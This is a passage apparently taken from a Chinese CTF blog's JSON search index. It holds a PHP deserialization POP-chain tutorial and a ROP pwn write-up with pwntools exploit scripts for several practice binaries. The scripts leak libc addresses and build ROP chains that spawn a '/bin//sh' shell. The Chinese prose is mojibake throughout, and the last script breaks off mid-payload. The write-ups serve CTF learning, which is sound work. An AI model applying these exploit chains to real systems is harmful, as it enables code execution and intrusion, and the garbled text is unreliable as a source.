ä»¥å¤–ï¼Œå¾€å¾€ä¼šä½¿ç”¨å¾ˆå¤šå…¶ä»–çš„PHPç»„ä»¶ã€‚è¿™äº›ç»„ä»¶ä»£ç å¯èƒ½ä¼šä½¿ç”¨ç›¸åŒçš„ç±»åã€æ¥å£åã€å‡½æ•°æˆ–è€…å¸¸é‡åç­‰ï¼Œå¦‚æœä¸ä½¿ç”¨å‘½åç©ºé—´å°±ä¼šå¯¼è‡´å‘½åå†²çªï¼Œä½¿PHPæ‰§è¡Œå‡ºé”™ã€‚è€Œå°†ä»£ç æ”¾åˆ°å„è‡ªå”¯ä¸€çš„å‘½åç©ºé—´ä¸­ï¼Œæˆ‘ä»¬çš„ä»£ç å°±å¯ä»¥å’Œå…¶ä»–å¼€å‘è€…ä½¿ç”¨ç›¸åŒçš„ç±»åã€æ¥å£åã€å‡½æ•°æˆ–è€…å¸¸é‡åç­‰ã€‚ æˆ‘ä»¬åªè¦çŸ¥é“ï¼Œåœ¨æ„é€ åˆ©ç”¨ç±»æ—¶ï¼Œé¡ºä¾¿åŠ ä¸Šå®ƒæ‰€åœ¨çš„å‘½åç©ºé—´å°±å¥½äº†ã€‚ 12&lt;?phpnamespace mainspace/subspace; è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å‘½åç©ºé—´ä¸­ä½¿ç”¨å…¨å±€ç±»ï¼Œéœ€è¦åœ¨ç±»åå‰åŠ ä¸Š/ç¬¦ï¼Œå¦åˆ™ä¼šå‡ºé”™ã€‚ 123456789&lt;?phpnamespace A\\B\\C;class Exception extends \\Exception {}$a = new Exception('hi'); // $a æ˜¯ç±» A\\B\\C\\Exception çš„ä¸€ä¸ªå¯¹è±¡$b = new \\Exception('hi'); // $b æ˜¯ç±» Exception çš„ä¸€ä¸ªå¯¹è±¡$c = new ArrayObject; // è‡´å‘½é”™è¯¯, æ‰¾ä¸åˆ° A\\B\\C\\ArrayObject ç±»?&gt; æ¼æ´åˆ©ç”¨é“¾æ–¹æ³•è®ºå…ˆé˜è¿°å¾ˆé‡è¦çš„POPé“¾åˆ©ç”¨ï¼Œç„¶åä»‹ç»ä¸€èˆ¬çš„æ¼æ´åˆ©ç”¨æ–¹æ³•ã€‚ POPé“¾å®ä¾‹å¦‚æœç›´æ¥ä»‹ç»POPé“¾çš„å®šä¹‰ï¼Œç›¸ä¿¡ä¼šå¾ˆæŠ½è±¡ï¼Œå¾ˆéš¾ç†è§£ã€‚æˆ‘ä»¬å…ˆé€šè¿‡ç®€å•çš„ä¾‹å­æ„Ÿæ€§è®¤è¯†ä¸€ä¸‹ 1234567891011121314151617181920&lt;?phpclass User{ public $name; function __destruct(){ if($this-&gt;name == \"admin\"){ echo \"\\nflag{This_is_flag}\"; } }}class Group{ public $user; //...}class Coll{ public $group; //...}?&gt; è¿™æ˜¯ä¸‰ä¸ªç±»çš„å®šä¹‰ï¼Œå®ƒä»¬æ˜¯é€’è¿›ä¾èµ–çš„å…³ç³»ã€‚æ¥ä¸‹æ¥åœ¨ä»£ç ä¸­æ·»åŠ ä»¥ä¸‹å‡ è¡Œ 12345678910//å£°æ˜$c = new User();$b = new Group();$a = new Coll();//åˆ©ç”¨$c-&gt;name = \"admin\";$b-&gt;user = $c;$a-&gt;group = $b;//è·å¾—expecho serialize($a); è¾“å‡ºäº†O:4:&quot;Coll&quot;:1:{s:5:&quot;group&quot;;O:5:&quot;Group&quot;:1:{s:4:&quot;user&quot;;O:4:&quot;User&quot;:1:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;}}}å’Œåº”æœ‰çš„flagï¼ˆå› ä¸ºæ‰§è¡Œå®Œè„šæœ¬è‡ªåŠ¨destructï¼‰ã€‚è€Œå¦‚æœè½¬è€Œæ·»åŠ ä»¥ä¸‹å‡ è¡Œ 12$string = 'O:4:\"Coll\":1:{s:5:\"group\";O:5:\"Group\":1:{s:4:\"user\";O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}}}';$Coll = unserialize($string); ä¹Ÿå¯ä»¥å¾—åˆ°flagï¼Œè¿™å°±æ˜¯ä¸€æ¬¡ç®€å•çš„POPé“¾åˆ©ç”¨è¿‡ç¨‹äº†ã€‚ POPé“¾POPæ˜¯é¢å‘å±æ€§ç¼–ç¨‹çš„æ„æ€ã€‚åœ¨ä»¥ä¸Šæ“ä½œä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨unserializeå‡½æ•°ï¼Œæ§åˆ¶äº†ä¸€äº›ç›¸äº’ä¾èµ–çš„å¯¹è±¡çš„å±æ€§ã€‚ unserializeå‡½æ•°ä¸Šé¢å·²ç»è®²è¿‡äº†ï¼Œå®ƒçš„æœ¬è´¨æ˜¯ï¼šæ§åˆ¶äº†å¯¹è±¡çš„æ‰€æœ‰å±æ€§ï¼Œå³ä½¿è¿™ä¸ªå±æ€§æ˜¯å¦ä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿå¯ä»¥æ§åˆ¶ã€‚ ä¸ºäº†åšåˆ°æ§åˆ¶æŸä¸ªå±æ€§ï¼Œæ§åˆ¶äº†ä¸€å±‚åˆä¸€å±‚çš„å¯¹è±¡ï¼Œè¿èµ·æ¥åƒé“¾æ¡ä¸€æ ·ã€‚å°±å¦‚ä¸Šä¾‹ï¼Œæˆ‘ä»¬æ„å›¾æ˜¯æ§åˆ¶nameï¼Œä¸ºäº†æ¼”ç¤ºï¼Œé€šè¿‡Coll-&gt;Group-&gt;User-&gt;nameè¿›è¡Œäº†æ§åˆ¶ã€‚è¿™å°±æ˜¯POPé“¾çš„æ„é€ ã€‚å…¶å®å¾ˆç®€å•ã€‚ ç›¸åŒå‡½æ•°åçš„æ¼æ´åˆ©ç”¨è¿™æ˜¯ä¸€ä¸ªæ‰©å±•åˆ©ç”¨é“¾çš„æ–¹æ³•ã€‚ æœ‰æ—¶å€™æ¼æ´å‡½æ•°åœ¨ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬æ­£å¸¸æ˜¯åšä¸åˆ°ä»¥å¯æ§å˜é‡è®¿é—®æ­¤æ–¹æ³•çš„ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯ä»¥æ§åˆ¶çš„ç±»ï¼Œä¸æ¼æ´å‡½æ•°æ‰€åœ¨æ–¹æ³•åŒåçš„æ–¹æ³•æ¥æ‰§è¡Œã€‚ä¾‹å­å¦‚ä¸‹ 12345678910111213141516171819202122232425&lt;?phpclass Main{ public $classObj; function __construct(){ $this-&gt;classObj = new Accessable(); } function __destruct(){ $this-&gt;classObj-&gt;action(); }}class NotAccessable{ function action(){ echo \"flag{this_is_flag}\"; }}class Accessable{ function action(){ echo \"flag is not here\"; }}?&gt; æ³¨æ„åˆ°actionæ–¹æ³•é‡åï¼Œå¯ä»¥æ„é€ exp 123456789101112131415&lt;?phpclass Main{ public $classObj; function __construct(){ $this-&gt;classObj = new NotAccessable(); }}class NotAccessable{}$str = serialize(new Main());echo $str;// O:4:\"Main\":1:{s:8:\"classObj\";O:13:\"NotAccessable\":0:{}}?&gt; å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œã€‚ åˆ©ç”¨é“¾åœ¨ä»£ç å®¡è®¡çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç©¿è¶Šåœ¨å¤æ‚çš„é€»è¾‘è¿·å®«é‡Œã€‚å½“æˆ‘ä»¬å‘ç°äº†æ¼æ´å‡½æ•°ï¼Œä¸€ç‚¹ç‚¹çš„è§‚å¯Ÿï¼šå“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ï¼Ÿå¯ä¸å¯ä»¥æœ€ç»ˆæ§åˆ¶å‡½æ•°çš„å‚æ•°ï¼Ÿä¸€ç‚¹ç‚¹åœ°æº¯æºä¸‹å»ï¼Œæœ€ç»ˆå‘ç°äº†æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„è¾“å…¥ç‚¹ã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œç”¨åˆ°çš„å‡½æ•°å±‚å±‚è°ƒç”¨åƒé“¾æ¡ä¸€æ ·è¿æ¥èµ·æ¥ï¼Œä¾¿æ˜¯åˆ©ç”¨é“¾ã€‚ æˆ‘è®¤ä¸ºåˆ©ç”¨é“¾æœ‰ä¸‰è¦ç´ ï¼šå¯æ§ç‚¹ï¼Œä¸­é—´è¿‡æ»¤ï¼Œåˆ©ç”¨ç‚¹ã€‚ å¯æ§ç‚¹å’Œåˆ©ç”¨ç‚¹éƒ½å¾ˆå®¹æ˜“ç†è§£ï¼Œé‡è¦çš„æ˜¯ä¸­é—´è¿‡æ»¤ï¼Œæˆ‘ä»¬å¸¸å¸¸éœ€è¦æŠŠè¿™äº›è¿‡æ»¤è®°ä¸‹æ¥ï¼Œåœ¨å¯æ§ç‚¹è¿›è¡Œbypassã€‚åˆ©ç”¨ç‚¹å†³å®šäº†æˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Œä¸­é—´è¿‡æ»¤å†³å®šäº†è¦æ€ä¹ˆåšï¼Œè€Œå¯æ§ç‚¹åˆ™æ˜¯ç‚¹å‡ºäº†æˆ‘ä»¬åœ¨å“ªåšã€‚å®é™…æ“ä½œçš„æ—¶å€™ï¼Œæˆ‘ä»¬åªè¦æ˜ç¡®è¿™ä¸‰ä¸ªé—®é¢˜ï¼Œå°±ä¸ä¼šè¿·å¤±æ–¹å‘ã€‚ å®è·µä¸æŠ€å·§å¦‚æœåˆ©ç”¨é“¾å¯ä»¥ä»è°èƒ½è°ƒç”¨æˆ‘ï¼Ÿå’Œæˆ‘èƒ½è°ƒç”¨è°ï¼Ÿä¸¤ä¸ªè§’åº¦å‡ºå‘ï¼Œä»åå¾€å‰+ä»å‰å¾€åä¸€èµ·éå†ï¼Œæœ€åä¸­é—´ç›¸é‡ã€‚ å®¡è®¡CMSæ—¶ï¼Œåˆ™å¾€å¾€æ˜¯ä»ç±»ä¸­å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œç„¶åç›´æ¥å…¨å±€å¯»æ‰¾èƒ½å¤Ÿè§¦å‘unserializeçš„ä»£ç ã€‚ ä¸­è§„ä¸­çŸ©çš„é¢˜ç›®12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?php//flag is in flag.phperror_reporting(1);class Read { public $var; public function file_get($value) { $text = base64_encode(file_get_contents($value));//[TARGET 1] return $text; } public function __invoke(){ $content = $this-&gt;file_get($this-&gt;var); echo $content; }}class Show{ public $source; public $str; public function __construct($file='index.php') { $this-&gt;source = $file; echo $this-&gt;source.'Welcome'.\"&lt;br&gt;\"; } public function __toString() { return $this-&gt;str['str']-&gt;source; } public function _show() { if(preg_match('/gopher|http|ftp|https|dict|\\.\\.|flag|file/i',$this-&gt;source)) { die('hacker'); } else { highlight_file($this-&gt;source); //[TARGET 2] } } public function __wakeup() { if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker\"; $this-&gt;source = \"index.php\"; } }}class Test{ public $p; public function __construct() { $this-&gt;p = array(); } public function __get($key) { $function = $this-&gt;p; return $function(); }}if(isset($_GET['hello'])){ unserialize($_GET['hello']);//[START]}else{ $show = new Show('pop3.php'); $show-&gt;_show();} æˆ‘æ ‡æ³¨äº†targetçš„ä¸¤å¤„ä¾¿æ˜¯æœ€ç»ˆè¦åˆ©ç”¨çš„å‡½æ•°ï¼Œstartçš„ä¸€å¤„å°±æ˜¯æˆ‘ä»¬å¯æ§è¾“å…¥ç‚¹ã€‚ å…ˆé€†æ¨è€ƒå¯ŸTarget 1 å¦‚ä½•åˆ°è¾¾æœ€åçš„file_get_content(å¯æ§)ï¼Ÿéœ€è¦åˆ°è¾¾file_get(å¯æ§)ï¼Œéœ€è¦__invoke()ä¸”$varå¯æ§ã€‚å¦‚ä½•è°ƒç”¨invokeï¼Ÿéœ€è¦æŠŠå¯¹è±¡å½“åšå‡½æ•°è°ƒç”¨ã€‚äºæ˜¯æˆ‘ä»¬å°±è¦å¯»æ‰¾åŠæ³•åšåˆ°è¿™ä¸€ç‚¹ï¼š 1... æŠŠä¸€ä¸ªRead()çš„å¯¹è±¡ä½œä¸ºå‡½æ•°è°ƒç”¨ä¸”å¯æ§$var -&gt; __invoke() ä¸”å¯æ§$var -&gt; file_get(å¯æ§) -&gt; file_get_content(å¯æ§)ã€Finishã€‘ å“ªé‡Œå¯ä»¥å‡½æ•°è°ƒç”¨å¯¹è±¡ï¼Ÿå½“ç„¶æ˜¯Test-&gt;__get()ã€‚__get()å¯ç”¨äºä»ä¸å­˜åœ¨çš„å±æ€§è¯»å–æ•°æ®ï¼Œé‚£ä¹ˆå“ªé‡Œå¯ä»¥è°ƒç”¨getï¼Ÿä¸å¤ªå¥½æ‰¾äº†ã€‚æˆ‘ä»¬å…ˆæ”¾ä¸€æ”¾ å†ä»starté¡ºæ¨è€ƒå¯Ÿã€‚unserialize()ä¼šè°ƒç”¨__wakeupæ–¹æ³•ï¼Œä¸”ç±»ä¸€åˆ‡å‚æ•°å¯æ§ã€‚è€ŒShow-&gt;__wakeup()ä¸­çš„preg_matchä¼šè°ƒç”¨ç±»çš„toStringï¼ŒShowç±»ä¸­æ°æœ‰toStringã€‚è·Ÿè¿›æ–¹æ³•ï¼Œå‘ç°å®ƒæƒ³è¦è·å¾—ç±»çš„å±æ€§ï¼Œé‚£å°±æœ‰å¯èƒ½å‡ºç°å±æ€§ä¸å­˜åœ¨çš„é—®é¢˜ã€‚è¿™ä¸ªè¿‡ç¨‹å¦‚ä¸‹ 1ã€Startã€‘-&gt;unserialize(å¯¹è±¡å±æ€§å…¨å¯æ§) -&gt; Showçš„wakeup()ä¸”sourceå¯æ§ -&gt; Showçš„sourceçš„toStringä¸”sourceå¯æ§ -&gt; Showçš„sourceçš„str['str']çš„__get()æ–¹æ³• -&gt; ... è‡³æ­¤ï¼Œæˆ‘ä»¬å‘ç°å‰åå·²ç»è¿æ¥ä¸Šäº†ã€‚ 1ã€Startã€‘-&gt;unserialize() -&gt; Showçš„wakeup() -&gt; Showçš„sourceçš„toString -&gt; Showçš„sourceçš„str['str']çš„__get() -&gt; å‡½æ•°è°ƒç”¨äº†Read()çš„ä¸€ä¸ªå¯¹è±¡ -&gt;Readçš„__invoke() -&gt; file_get() -&gt; file_get_content()ã€Finishã€‘ é‚£ä¹ˆå°±å¯ä»¥æ„é€ POPé“¾ï¼š 12345678910111213141516171819202122232425&lt;?php class Show{ public $source; public $str;}class Test{ public $p;}class Read{ public $var = \"flag.php\";}$s = new Show();$t = new Test();$r = new Read();$t-&gt;p = $r;$s-&gt;str[\"str\"] = $t;$s-&gt;source = $s;var_dump(serialize($s)); ?&gt;","link":"/2020/03/18/pop%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"title":"Easy_ROP points","text":"ä½œè€…ï¼šLordRiot 2æœˆä»½ç¾èµ›çš„ä¸çˆ½ç»å†æå¾—äººå¾ˆä¸æƒ³å­¦æ•°å­¦å»ºæ¨¡ï¼Œäºæ˜¯æœ€è¿‘å¼€å§‹å¤ä¹ pwnï¼Œè¿™ç¯‡æ–‡ç« å¤§æ¦‚æ€»ç»“ä¸€ä¸‹è¿™ä¸€å‘¨å¤ä¹ çš„ROPä¸­ä¸€äº›å°point: ) è¿™ç¯‡ä¸­å‡ºç°çš„é¢˜å‡æ˜¯ichunqiuä¸­Linux PwnåŸºç¡€ROPä¸­çš„é¢˜ç›®ï¼Œé¢˜ç›®ä¸­çš„expå¯èƒ½æœ‰äº›libcç¯å¢ƒé—®é¢˜ï¼Œ å…·ä½“åœ°å€æ•°å€¼ä¸èƒ½ç›´æ¥ä»£å…¥ï¼Œä½†æ€è·¯å‡å¯å‚è€ƒ:-(å…¶å®æ˜¯æˆ‘æœ¬åœ°è«ååŠ è½½ä¸äº†é¢˜ç»™libc 2333) TU CTF 2016-especially good jmpsè¿™ä¸ªé¢˜ä¸€å¼€å§‹æœ‰äº›å›°æ‰°æˆ‘çš„ç‚¹åœ¨äºscanfè¯»å…¥æ•°å­—ä¹‹åæ²¡æœ‰æ¸…ç©ºç¼“å†²åŒºï¼Œå¦‚æœç›´æ¥sendline(â€˜1â€™)è¿™æ ·ï¼Œé‚£ä¹ˆç¼“å†²åŒºçš„â€™\\nâ€™å°±ä¼šå°†ä¸‹ä¸ªgetsæˆªæ–­ï¼Œäºæ˜¯æƒ³åˆ°åœ¨â€™1â€™åé¢åŠ ä¸€ä¸ªå­—æ¯æ¥æˆªæ–­scanfå¯¹æ•´æ•°çš„è¯»å–ï¼Œç›¸å½“äºpayloadå¼€å¤´çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¹‹åçš„paddingè®°å¾—ç›¸åº”å°‘ä¸€ä¸ªå­—ç¬¦å³å¯ï¼Œexpå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435p = process('especially_good_jmps')puts_got = 0x0804A018puts_plt = 0x080483E0main_addr = 0x08048420sh_addr = 0x08048293payload = &quot;\\x00&quot; * 0x2Cpayload += p32(puts_plt)payload += p32(main_addr)payload += p32(puts_got)p.recvuntil('name?\\n')p.sendline(payload)p.recvuntil('number?\\n')p.send('1l') #cut off the scanf() readingp.recvuntil('odd number!\\n')puts_addr = u32(p.recv(4))print(hex(puts_addr))obj = LibcSearcher(&quot;puts&quot;, puts_addr)base_addr = puts_addr - obj.dump(&quot;puts&quot;)sys_addr = base_addr + obj.dump(&quot;system&quot;)payload = &quot;a&quot; * 0x2b #because of the 'l' hence here is 0x2c - 1 = 0x2bpayload += p32(sys_addr)payload += p32(main_addr)payload += p32(sh_addr)p.recvuntil('name?\\n')p.sendline(payload)p.recvuntil('number?\\n')p.sendline('1')p.interactive() Alictf 2016-vssemmmmmmï¼Œç®—æ˜¯æˆ‘åšè¿‡çš„ç¬¬ä¸€ä¸ªé™æ€ç¼–è¯‘çš„é¢˜ï¼Œä¸€å¼€å§‹æ”¾åˆ°IDAé‡Œæˆ‘ç›´æ¥æ‡µäº†ï¼Œ800å¤šä¸ªå‡½æ•°ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯ä¸ªé€†å‘é¢˜ï¼Œåæ¥æŸ¥äº†ç‚¹ç›¸å…³èµ„æ–™ï¼Œæ‰çŸ¥é“æ˜¯ä¸ªé™æ€ç¼–è¯‘é¢˜ï¼Œå³å°†libcä¸­çš„å‡½æ•°ç›´æ¥æ”¾åˆ°ç¨‹åºé‡Œã€‚ç„¶åå°±æ˜¯å‡½æ•°è®¤è¯çš„é—®é¢˜ï¼Œå› ä¸ºåæ±‡ç¼–æ˜¯ä¸€å †sub_xxxxxï¼Œemmmmmä¸€ä¸ªä¸€ä¸ªçœ‹è¿˜æ˜¯æ¯”è¾ƒè´¹åŠ²çš„ï¼Œéœ€è¦ä»ç»™IDAå¼•å…¥libc.sigæ–‡ä»¶ï¼Œå°†sigæ•°æ®åº“çš„sigæ–‡ä»¶å¯¼å…¥IDAä¸‹çš„â€/lscan/lscan/i386/sigâ€ï¼Œç„¶ååœ¨IDAä¸­ä½¿ç”¨shift + F5å³å¯åº”ç”¨ï¼Œä½†æ˜¯åŒ¹é…åº¦æœ‰å¤šæœ‰å°‘ï¼Œè¿™ä¸ªé¢˜æˆ‘æœ€ç»ˆç”¨ä¸‰ä¸ªsigæ–‡ä»¶åŒ¹é…åˆ°äº†400å¤šä¸ªå‡½æ•°ï¼Œæˆ‘è¯•äº†ç”¨githubä¸Šä¸€ä¸ªlscançš„å·¥å…·ï¼Œä½†æ˜¯å¹¶ä¸å¥½ç”¨ï¼ŒåŒ¹é…ç‡4000+%å°±ç¦»è°±ï¼Œæ‰€ä»¥ç›®å‰å¯èƒ½è¿˜æ˜¯åªèƒ½è‡ªå·±æ‰‹åŠ¨æ·»åŠ ï¼Œä¸è¿‡æœ‰ä¸€äº›ä¸»è¦å‡½æ•°å¤§è‡´å°±å¤Ÿäº†ï¼Œè¿™é¢˜æœ¬èº«ä¸»è¦æ˜¯åˆ©ç”¨æŠ¬æ ˆæ‰§è¡Œropchainå³å¯ï¼Œå…·ä½“åŸç†å…¶å®è‡ªå·±æƒ³ä¸‹å‡½æ•°è°ƒç”¨å¾ˆå¥½æ˜ç™½ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091p = process('vss')add_rsp = 0x46f2f1payload = 'py'payload = payload.ljust(0x48, 'a')payload += p64(add_rsp)payload = payload.ljust(0x78, 'a') #to get the rop addr# the ropchain from ROPgadget:payload += pack('&lt;Q', 0x0000000000401937) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c4080) # @ .datapayload += pack('&lt;Q', 0x000000000046f208) # pop rax ; retpayload += '/bin//sh'payload += pack('&lt;Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; retpayload += pack('&lt;Q', 0x0000000000401937) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c4088) # @ .data + 8payload += pack('&lt;Q', 0x000000000041bd1f) # xor rax, rax ; retpayload += pack('&lt;Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; retpayload += pack('&lt;Q', 0x0000000000401823) # pop rdi ; retpayload += pack('&lt;Q', 0x00000000006c4080) # @ .datapayload += pack('&lt;Q', 0x0000000000401937) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c4088) # @ .data + 8payload += pack('&lt;Q', 0x000000000043ae05) # pop rdx ; retpayload += pack('&lt;Q', 0x00000000006c4088) # @ .data + 8payload += pack('&lt;Q', 0x000000000041bd1f) # xor rax, rax ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x00000000004004b8) # syscallp.recvuntil('Password')p.sendline(payload)p.interactive() BackdoorCTF 2017-just do itè¿™ä¸ªé¢˜æˆ‘ä¹Ÿæ˜¯é‡åˆ°äº†å’Œä¹‹å‰especially_good_jmpsä¸€æ ·çš„å›°æ‰°ï¼Œç¼“å†²åŒºæ²¡æœ‰æ¸…ç©ºï¼Œæ— æ³•åˆ©ç”¨readå‡½æ•°å°†â€™shâ€™è¯»åˆ°æŒ‡å®šdataæ®µï¼Œåæ¥æƒ³åˆ°å†leakå‡ºåœ°å€åå¯ä»¥åˆ©ç”¨fflshå‡½æ•°æ¸…ç©ºä¸€æ¬¡ç¼“å†²åŒºï¼Œç„¶åå†è¯»å…¥â€™shâ€™å³å¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859p = process('32_chal')pop_esi = 0x0804853dmain_addr = 0x0804847Dgot = 0x0804A00Cwrite_plt = 0x08048370data_addr = 0x0804A020read_plt = 0x08048330payload = 'a' * 0x70payload += p32(write_plt)payload += p32(main_addr)payload += p32(1)payload += p32(got)payload += p32(4)p.recvuntil('Hello pwners, \\n')p.sendline(payload)function = 'read'da = u32(p.recvuntil('H')[1:5])addr = dabase_addr = addr - libc32.sym[function]sys_addr = base_addr + libc32.sym['system']gets_addr = base_addr + libc32.sym['gets']fflush_addr = base_addr + libc32.sym['fflush']print(hex(base_addr))print(hex(sys_addr))payload = 'a' * 0x68payload += p32(fflush_addr) #use the fflush to make the read function workspayload += p32(main_addr)payload += p32(0)p.recvuntil('pwners, \\n')p.sendline(payload)payload = 'a' * 0x70payload += p32(read_plt)payload += p32(main_addr)payload += p32(0)payload += p32(data_addr)payload += p32(5)p.recvuntil('pwners, \\n')p.sendline(payload)sleep(1)p.sendline('sh')payload = 'a' * 0x68payload += p32(sys_addr)payload += p32(main_addr)payload += p32(data_addr)p.recvuntil('pwners, \\n')p.sendline(payload)p.interactive() boston key party 2016-simple calcè¿™é¢˜å…¶å®æœ¬èº«æŒºç®€å•ï¼Œä¹Ÿæ˜¯ä¸ªé™æ€ç¼–è¯‘ï¼Œä¸è¿‡è¾“å…¥éœ€è¦åˆ¤æ–­ï¼Œç®€å•å†™ä¸ªåˆ¤æ–­å‡½æ•°å°±è¡Œï¼Œåªæ˜¯ä¸€å¼€å§‹æ‡’å¾—è‡ªå·±ç ä»£ç ï¼Œæƒ³å»çœ‹çœ‹åˆ«çš„dalaoæ€ä¹ˆåšï¼Œç»“æœçœ‹æœ‰çš„expä¸€ä¸ªä¸€ä¸ªå­—èŠ‚æ‰‹åŠ¨æ„é€ ï¼Œç»™æˆ‘çœ‹å‚»äº†ï¼Œé‚è¿˜æ˜¯è‡ªå·±å†™äº†2333ï¼Œæ³¨æ„å››ä¸ªå­—èŠ‚ä¸€ä¸ªæ•°å­—ï¼Œåˆ†æƒ…å†µç”¨åŠ ï¼Œå‡ï¼Œä¹˜ä¸‰ç§æ‹†åˆ†å³å¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127p = process('simple_calc')def SEND(number, A1, A2): p.recvuntil('=&gt; ') p.sendline(str(number)) p.recvuntil('Integer x:') p.sendline(str(A1)) p.recvuntil('Integer y:') p.sendline(str(A2))def get_factor(number): for i in range(40, (int)(math.sqrt(number))): if number % i == 0: return i, number/i return 0, 0payload = '0' * 0x30payload += p64(0) # the parameter of free would be covered by thispayload = payload.ljust(0x48, &quot;\\x00&quot;) # let the program conntinue, use the nullpayload += pack('&lt;Q', 0x0000000000401c87) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c1060) # @ .datapayload += pack('&lt;Q', 0x000000000044db34) # pop rax ; retpayload += '/bin//sh'payload += 